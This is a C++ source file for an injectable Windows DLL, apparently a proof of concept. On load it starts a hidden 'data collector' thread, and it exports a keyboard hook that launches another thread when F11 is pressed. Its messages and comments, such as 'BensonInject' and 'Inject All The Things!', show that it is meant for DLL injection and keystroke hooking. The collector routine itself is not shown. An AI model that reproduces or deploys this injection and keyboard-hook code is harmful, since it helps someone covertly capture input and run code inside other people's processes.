// dllmain.cpp : Defines the entry point for the DLL application.
#include "stdafx.h"

HANDLE hThread = NULL;

BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
					 )
{
	OutputDebugStringA("MDC: DllMain");
	switch (ul_reason_for_call)
	{
	case DLL_PROCESS_ATTACH:
		//OutputDebugStringA("DllMain entry");
		g_hInstance=hModule;
		DataCollectorThread=CreateThread(NULL, 0, DataCollectorEntry, NULL, 0, NULL);
		SuicideThread=0;//CreateThread(NULL, 0, SuicideCheck, NULL, 0, NULL);
		break;

	case DLL_THREAD_ATTACH:
	case DLL_THREAD_DETACH:
	case DLL_PROCESS_DETACH:
		break;
	}
	return TRUE;
}
DWORD WINAPI ThreadFunc(LPVOID lpParamter)
{
	g_hInstance = GetModuleHandleA(NULL);
	DataCollectorThread = CreateThread(NULL, 0, DataCollectorEntry, NULL, 0, NULL);
	SuicideThread = 0;//CreateThread(NULL, 0, SuicideCheck, NULL, 0, NULL);
	MessageBoxA(NULL, "BensonInject", "KeyBoard_InjectDll_OK", MB_OK);
	while (true)
	{
		printf("keep_key_hook_run\n");
		Sleep(5000);
	}
	hThread = NULL;
	return 0;
}

extern "C" __declspec(dllexport) BOOL poc(int code, WPARAM wParam, LPARAM lParam) {
	//MessageBox(NULL, L"POC called!", L"Inject All The Things!", 0);
	if (code == HC_ACTION && lParam > 0)
	{
		PKBDLLHOOKSTRUCT p = (PKBDLLHOOKSTRUCT)lParam;
		char Buffer[10] = { 0 };
		GetKeyNameTextA(lParam, Buffer, 10);
		if (wParam == VK_F11) {
			DWORD mask = (1 << 31);
			DWORD keyUp = lParam & mask;

			if (keyUp) {
				// F11 键抬起事件处理
			}
			else {
				// F11 键按下事件处理
				if (hThread == NULL) {
					hThread = CreateThread(NULL, 0, ThreadFunc, NULL, 0, NULL);
				}
			}
		}
		
		
	}
	return(CallNextHookEx(NULL, code, wParam, lParam));
}